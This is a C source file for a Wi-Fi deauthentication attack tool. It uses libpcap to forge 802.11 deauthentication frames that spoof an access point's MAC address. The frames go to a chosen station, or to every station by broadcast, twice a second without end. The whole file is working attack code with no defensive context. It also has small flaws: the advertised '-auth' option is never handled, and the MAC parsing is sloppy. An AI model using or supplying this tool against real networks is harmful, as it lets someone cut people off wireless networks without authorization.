#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <unistd.h>

struct RadioHeader{
	u_char rad_rev;
	u_char rad_pad;
	short  rad_len;
	u_char rad_present[20];
};

struct DeauthFrame{
    struct RadioHeader RadioHdr;
    short FrameControl;
    short Duration;
    u_char DestinationAddress[6];
    u_char SourceAddress[6];
    u_char BSSID[6];
    short Seq_ctl;
    short ReasonCode;
};

void setDeauthFrame(struct DeauthFrame *p_df, u_char *AP_addr, u_char *Station_addr );
void setRadioHdr(struct RadioHeader *p_rad);
void sendPacket(pcap_t *handle, struct DeauthFrame *p_bc);
u_char *strtoMAC(char *str, u_char *MAC);

int main(int argc, char **argv)
{
    if(argc < 3){
        fprintf(stderr, "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]");
        exit(EXIT_FAILURE);
    }
    

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

	handle = pcap_open_live(argv[1], BUFSIZ,1, 1000, errbuf);
    if(!handle){
			fprintf(stderr,"\n Error occured while opening the adapter");
			return 0;
	}

    struct DeauthFrame *frame;

    frame = malloc(sizeof(struct DeauthFrame));
	memset(frame,0, sizeof(struct DeauthFrame));

	setRadioHdr(&(frame->RadioHdr));

    //temp variables
    u_char AP_ADDR[6];
    u_char STATION_ADDR[6];

    
    strtoMAC(argv[2], AP_ADDR);
    if(argc > 3){
        strtoMAC(argv[3], STATION_ADDR);
    } else{
        memset(STATION_ADDR,0xFF, sizeof(STATION_ADDR));
    }
    
    setDeauthFrame(frame, AP_ADDR, STATION_ADDR);

    while(1){
        sendPacket(handle,frame);
        usleep(500000);
    }
    free(frame);
    return 0;
}

u_char *strtoMAC(char *str, u_char *MAC){
    char* endPtr;

    for(int i=0; i <=17; i +=3 ){
        char temp[3];
        strncpy(temp, str+i, sizeof(temp));

        int idx_for_MAC = i / 3;
        MAC[idx_for_MAC] = (u_char)strtol(temp, &endPtr, 16);
    }

    return MAC;
}   

void setDeauthFrame(struct DeauthFrame *p_df, u_char *AP_addr, u_char *Station_addr){
    p_df->FrameControl = 0x00C0; // Frame Control type for Deauthentication
    p_df->Duration = 0x013A; // Duration 314 microseconds

    // set Destination Address(Station)
    memcpy(p_df->DestinationAddress, Station_addr, sizeof(p_df->DestinationAddress));
    // set source Address(AP)
    memcpy(p_df->SourceAddress, AP_addr, sizeof(p_df->SourceAddress));

    //set BSSID
    memcpy(p_df->BSSID, AP_addr, sizeof(p_df->BSSID));

    //set Sequence and Fragment Number;
    p_df->Seq_ctl = 0x0;

    //set Reason Code for "Class 3 frame received from nonassociated STA"
    p_df->ReasonCode =  0x0700;

}

void setRadioHdr(struct RadioHeader *p_rad){
	p_rad->rad_rev = 0;
	p_rad->rad_pad = 0;
	p_rad->rad_len = 24;

	memset(p_rad->rad_present, 0, sizeof(p_rad->rad_present));
}

void sendPacket(pcap_t *handle, struct DeauthFrame *p_bc){
    //printf("BeaconFrame size: %ld \n", sizeof(struct BeaconFrame));

    if (pcap_sendpacket(handle,(const u_char *)p_bc, sizeof(struct DeauthFrame)) != 0)
    {
        fprintf(stderr,"\nError sending the packet: %s \n", pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }
    printf("packet Sended!\n");
}
